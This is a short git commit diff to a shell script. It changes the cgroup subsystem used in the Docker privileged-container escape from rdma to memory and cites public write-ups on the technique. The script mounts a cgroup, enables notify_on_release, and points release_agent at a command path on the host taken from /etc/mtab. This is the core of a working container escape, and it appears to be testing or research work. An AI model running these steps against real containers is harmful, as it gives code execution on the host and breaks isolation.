b58db5eb5d77dd2f55a31d20f68bfb23447a7f56
Kohsuke Kawaguchi <kk@kohsuke.org>
2021-03-01 19:24:22 -0800

    Trying -o memory based on https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

--- test.sh
+++ test.sh
@@ -1,6 +1,8 @@
-#!/bin/bash
+#!/bin/bash -x
 # see https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+mkdir /tmp/cgrp
+mount -t cgroup -o memory cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
